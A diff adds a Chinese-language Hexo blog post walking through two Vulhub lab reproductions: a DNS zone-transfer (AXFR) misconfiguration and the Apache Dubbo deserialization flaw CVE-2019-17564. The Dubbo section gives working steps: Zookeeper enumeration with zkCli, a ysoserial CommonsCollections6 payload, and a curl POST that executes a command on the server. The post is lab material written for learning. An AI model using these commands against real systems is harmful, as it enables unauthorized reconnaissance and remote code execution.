@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>dns-dubbo-0 | Hexo</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="DNS域传送漏洞介绍简介​        DNS协议支持使用axfr类型的记录进行区域传送，用来解决主从同步的问题。它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。DNS使用TCP和UDP端口53，当前，对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。 常用的DNS记录有以下几类： 1234567891011121314151617181920">
+<meta property="og:type" content="article">
+<meta property="og:title" content="dns-dubbo-0">
+<meta property="og:url" content="http://example.com/2023/12/07/dns-dubbo-0/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="DNS域传送漏洞介绍简介​        DNS协议支持使用axfr类型的记录进行区域传送，用来解决主从同步的问题。它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。DNS使用TCP和UDP端口53，当前，对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。 常用的DNS记录有以下几类： 1234567891011121314151617181920">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2023/12/07/dns-dubbo-0/image-20231206140356744.png">
+<meta property="og:image" content="http://example.com/2023/12/07/dns-dubbo-0/image-20231206140933605.png">
+<meta property="og:image" content="http://example.com/2023/12/07/dns-dubbo-0/image-20231206141021574.png">
+<meta property="og:image" content="http://example.com/2023/12/07/dns-dubbo-0/image-20231206144648090.png">
+<meta property="og:image" content="http://example.com/2023/12/07/dns-dubbo-0/image-20231206144916977.png">
+<meta property="og:image" content="http://example.com/2023/12/07/dns-dubbo-0/image-20231206145843956.png">
+<meta property="og:image" content="http://example.com/2023/12/07/dns-dubbo-0/image-20231206145950118.png">
+<meta property="og:image" content="http://example.com/2023/12/07/dns-dubbo-0/image-20231207145855392.png">
+<meta property="og:image" content="http://example.com/2023/12/07/dns-dubbo-0/image-20231207145840243.png">
+<meta property="article:published_time" content="2023-12-07T07:11:52.000Z">
+<meta property="article:modified_time" content="2023-12-07T07:22:16.053Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="dns dubbo">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/12/07/dns-dubbo-0/image-20231206140356744.png">
+  
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+				<img lazy-src="" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+			<h1 class="header-author"><a href="/">John Doe</a></h1>
+		</hgroup>
+
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">Home</a></li>
+				        
+							<li><a href="/archives">Archives</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="half-header-menu">
+						<a class="hide">Home</a>
+						<a>Tags</a>
+						<a>Links</a>
+						<a>About</a>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+						<!-- music -->
+						
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/ActiveMQ/" style="font-size: 10px;">ActiveMQ</a> <a href="/tags/ActiveMQ-CVE-2015-5254/" style="font-size: 10px;">ActiveMQ CVE-2015-5254</a> <a href="/tags/CVE-2021-21311-CVE-2021-43008/" style="font-size: 10px;">CVE-2021-21311 CVE-2021-43008</a> <a href="/tags/CVE-2021-25646/" style="font-size: 10px;">CVE-2021-25646</a> <a href="/tags/SQL/" style="font-size: 10px;">SQL</a> <a href="/tags/airflow/" style="font-size: 10px;">airflow</a> <a href="/tags/apisix/" style="font-size: 10px;">apisix</a> <a href="/tags/appweb-aria2/" style="font-size: 10px;">appweb aria2</a> <a href="/tags/couchdb/" style="font-size: 10px;">couchdb</a> <a href="/tags/csrf-ssrf/" style="font-size: 10px;">csrf ssrf</a> <a href="/tags/dns-dubbo/" style="font-size: 10px;">dns dubbo</a> <a href="/tags/php/" style="font-size: 20px;">php</a> <a href="/tags/php-mysql/" style="font-size: 15px;">php;mysql</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82-POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6-WAF-SQLMAP/" style="font-size: 10px;">堆叠注入,宽字节,POST注入,HTTP头注入,二次注入,写入文件,WAF,SQLMAP</a> <a href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/" style="font-size: 20px;">春秋云镜</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/">github</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">I&#39;m a developer.</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">Home</a></li>
+		        
+					<li><a href="/archives">Archives</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-dns-dubbo-0" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2023/12/07/dns-dubbo-0/" class="article-date">
+  	<time datetime="2023-12-07T07:11:52.000Z" itemprop="datePublished">2023-12-07</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      dns-dubbo-0
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/dns-dubbo/" rel="tag">dns dubbo</a></li></ul>
+	</div>
+
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="DNS域传送漏洞"><a href="#DNS域传送漏洞" class="headerlink" title="DNS域传送漏洞"></a>DNS域传送漏洞</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>​        DNS协议支持使用axfr类型的记录进行区域传送，用来解决主从同步的问题。它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。DNS使用TCP和UDP端口53，当前，对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。</p>
+<p>常用的DNS记录有以下几类：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">主机记录(A记录)：</span><br><span class="line">A记录是用于名称解析的重要记录，它将特定的主机名映射到对应主机的IP地址上。</span><br><span class="line"></span><br><span class="line">IPv6主机记录(AAAA记录)：</span><br><span class="line">与A记录对应，用于将特定的主机名映射到一个主机的IPv6地址。</span><br><span class="line"></span><br><span class="line">别名(CNAME记录)：</span><br><span class="line">CNAME记录用于将某个别名指向到某个A记录上，这样就不需要再为某个新名字另外创建一条新的A记录。</span><br><span class="line"></span><br><span class="line">电子邮件交换记录（MX记录)：</span><br><span class="line">记录一个邮件域名对应的IP地址</span><br><span class="line"></span><br><span class="line">域名服务器记录 (NS记录)：</span><br><span class="line">记录该域名由哪台域名服务器解析</span><br><span class="line"></span><br><span class="line">反向记录(PTR记录):</span><br><span class="line">也即从IP地址到域名的一条记录</span><br><span class="line"></span><br><span class="line">TXT记录：</span><br><span class="line">记录域名的相关文本信息</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>​        如果管理员在配置DNS服务器的时候没有限制允许获取记录的来源，将会导致DNS域传送漏洞。</p>
+<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>Vulhub使用<a target="_blank" rel="noopener" href="https://wiki.debian.org/Bind9">Bind9</a>来搭建dns服务器，但不代表只有Bind9支持AXFR记录。运行DNS服务器：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231206140356744.png" alt="image-20231206140356744"></p>
+<p>环境运行后，将会监听TCP和UDP的53端口，DNS协议同时支持从这两个端口进行数据传输。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>​    在Linux下，可以使用dig命令来发送dns请求。比如，可以用<code>dig @your-ip www.vulhub.org</code>获取域名<code>www.vulhub.org</code>在目标dns服务器上的A记录：    </p>
+<p><img src="image-20231206140933605.png" alt="image-20231206140933605"></p>
+<p>发送axfr类型的dns请求：<code>dig @your-ip -t axfr vulhub.org</code></p>
+<p>axfr指请求传送某个区域的全部记录。只要欺骗dns服务器发送一个axfr请求过去，如果该dns服务器上存在该漏洞，就会返回所有的解析记录值</p>
+<p><img src="image-20231206141021574.png" alt="image-20231206141021574"></p>
+<h1 id="Aapche-Dubbo-Java反序列化漏洞（CVE-2019-17564）"><a href="#Aapche-Dubbo-Java反序列化漏洞（CVE-2019-17564）" class="headerlink" title="Aapche Dubbo Java反序列化漏洞（CVE-2019-17564）"></a>Aapche Dubbo Java反序列化漏洞（CVE-2019-17564）</h1><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>​    Apache Dubbo是一款高性能、轻量级的开源Java RPC服务框架。</p>
+<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>​    在Spring文档中，对<code>HttpInvokerServiceExporter</code>有如下描述，并不建议使用：</p>
+<blockquote>
+<p>WARNING: Be aware of vulnerabilities due to unsafe Java deserialization: Manipulated input streams could lead to unwanted code execution on the server during the deserialization step. As a consequence, do not expose HTTP invoker endpoints to untrusted clients but rather just between your own services. In general, we strongly recommend any other message format (e.g. JSON) instead.</p>
+</blockquote>
+<p>​    这个漏洞影响Apache Dubbo 2.7.4及以前版本，2.7.5后Dubbo使用<code>com.googlecode.jsonrpc4j.JsonRpcServer</code>替换了<code>HttpInvokerServiceExporter</code>。</p>
+<h3 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>​        Dubbo可以使用不同协议通信，当使用http协议时，Apache Dubbo直接使用了Spring框架的<code>org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter</code>类做远程调用，而这个过程会读取POST请求的Body并进行反序列化，最终导致漏洞。</p>
+<h2 id="漏洞环境-1"><a href="#漏洞环境-1" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>编译及启动漏洞环境：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231206144648090.png" alt="image-20231206144648090"></p>
+<p>服务启动后，访问<code>http://your-ip:8080</code>，服务器默认会返回500错误。</p>
+<p><img src="image-20231206144916977.png" alt="image-20231206144916977"></p>
+<h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>​    利用该漏洞需要先知道目标RPC接口名，而Dubbo所有的RPC配置储存在registry中，通常使用Zookeeper作为registry。如果能刚好找到目标的Zookeeper未授权访问漏洞，那么就可以在其中找到接口的名称与地址。</p>
+<p>​    Vulhub对外开放了8080端口和2181端口，其中2181即为Zookeeper的端口，本地下载<a target="_blank" rel="noopener" href="https://zookeeper.apache.org/">Zookeeper</a>，使用其中自带的<strong>zkCli</strong>即可连接到这台Zookeeper服务器：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;zkCli -server target-ip:2181</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231206145843956.png" alt="image-20231206145843956"></p>
+<p>连接后进入一个交互式控制台，使用<code>ls</code>即可列出其中所有节点，包括Dubbo相关的配置：</p>
+<p><img src="image-20231206145950118.png" alt="image-20231206145950118"></p>
+<p>获取到RPC接口名为<code>org.vulhub.api.CalcService</code>。直接用ysoserial生成CommonsCollections6的Payload作为POST Body发送到<code>http://your-ip:8080/org.vulhub.api.CalcService</code>即可触发反序列化漏洞：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections6 &quot;touch &#x2F;tmp&#x2F;success&quot; &gt; 1.poc</span><br><span class="line">curl -XPOST --data-binary @1.poc http:&#x2F;&#x2F;your-ip:8080&#x2F;org.vulhub.api.CalcService</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231207145855392.png" alt="image-20231207145855392"></p>
+<p>进入容器，可见<code>touch /tmp/success</code>已成功执行。</p>
+<p><img src="image-20231207145840243.png" alt="image-20231207145840243"></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2023/11/30/couchdb/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">couchdb</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2023 John Doe
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: false,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
